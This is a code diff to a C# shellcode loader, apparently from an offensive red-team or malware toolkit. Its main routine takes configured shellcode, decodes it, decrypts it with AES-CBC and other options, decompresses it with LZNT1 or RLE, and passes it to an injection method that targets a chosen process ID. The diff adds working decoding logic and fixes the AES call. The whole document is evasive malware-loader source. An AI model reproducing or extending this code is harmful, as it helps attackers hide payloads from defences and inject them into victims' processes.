@@ -9,7 +9,6 @@ namespace ShellcodeLoader
         [SupportedOSPlatform("windows")]
         public static void Main(string[] args)
         {
-            // Load configuration
             string injectionMethod = InjectionConfig.InjectionMethod;
             int targetPid = InjectionConfig.TargetPID;
             byte[] shellcode = InjectionConfig.Shellcode;
@@ -18,28 +17,29 @@ namespace ShellcodeLoader
             if (targetPid > 0)
                 DebugLogger.WriteLine($"[*] Target PID: {targetPid}");
 
-            // Get encrypted shellcode
-            // byte[] shellcode = ErebusRsrc.erebus_bin;
             DebugLogger.WriteLine($"[+] Initial shellcode size: {shellcode.Length} bytes");
 
             // ============================================================
             // DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
             // ============================================================
 
-            // STEP 1: DECODE (String-based encoding via config)
+            // STEP 1: DECODE
             DebugLogger.WriteLine("\n[*] STEP 1: Decoding shellcode based on configuration...");
             if (InjectionConfig.EncodingType > 0)
             {
-                DebugLogger.WriteLine($"[*] Configured encoding type: {InjectionConfig.EncodingType}");
-                // Decoding logic would be applied if shellcode is string-encoded
-                // For now, assuming shellcode is already in byte array form
+                string rawPayload = System.Text.Encoding.ASCII.GetString(shellcode);
+                DetectEncodingFormat targetFormat = (DetectEncodingFormat)InjectionConfig.EncodingType;
+
+                DebugLogger.WriteLine($"[*] Decoding format: {targetFormat}");
+                shellcode = CompressionDecodingUtils.DecodeStringByFormat(rawPayload, targetFormat);
+                DebugLogger.WriteLine($"[+] Decoded payload size: {shellcode.Length} bytes");
             }
             else
             {
-                DebugLogger.WriteLine("[*] No encoding configured (EncodingType = 0), skipping decoding");
+                DebugLogger.WriteLine("[*] No encoding configured, skipping decoding");
             }
 
-            // STEP 2: DECRYPT (Encryption via config)
+            // STEP 2: DECRYPT
             DebugLogger.WriteLine("[*] STEP 2: Decrypting shellcode based on configuration...");
             switch (InjectionConfig.EncryptionType)
             {
@@ -60,7 +60,7 @@ namespace ShellcodeLoader
 
                 case 4:
                     DebugLogger.WriteLine("[+] Applying AES-CBC decryption...");
-                    shellcode = DecryptionUtils.DecryptAES_CBC(shellcode, InjectionConfig.EncryptionKey);
+                    shellcode = DecryptionUtils.DecryptAES_CBC(shellcode, InjectionConfig.EncryptionKey, InjectionConfig.EncryptionIV);
                     break;
 
                 default:
@@ -68,18 +68,18 @@ namespace ShellcodeLoader
                     break;
             }
 
-            // STEP 3: DECOMPRESS (Binary compression via config)
+            // STEP 3: DECOMPRESS
             DebugLogger.WriteLine("[*] STEP 3: Decompressing shellcode based on configuration...");
             switch (InjectionConfig.CompressionType)
             {
                 case 1:
                     DebugLogger.WriteLine("[+] Applying LZNT1 decompression...");
-                    shellcode = CompressionDecodingUtils.DecompressLZNT1(shellcode);
+                    shellcode = CompressionDecodingUtils.DecompressionLZNT(shellcode);
                     break;
 
                 case 2:
                     DebugLogger.WriteLine("[+] Applying RLE decompression...");
-                    shellcode = CompressionDecodingUtils.DecompressRLE(shellcode);
+                    shellcode = CompressionDecodingUtils.DecompressionRLE(shellcode);
                     break;
 
                 default:
@@ -88,11 +88,6 @@ namespace ShellcodeLoader
             }
             DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");
 
-            // Final entropy check
-            // int finalEntropy = DecryptionUtils.CalculateEntropyScore(shellcode);
-            // DebugLogger.WriteLine($"[*] Final entropy score: {finalEntropy}/100");
-
-            // Execute injection
             try
             {
                 IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
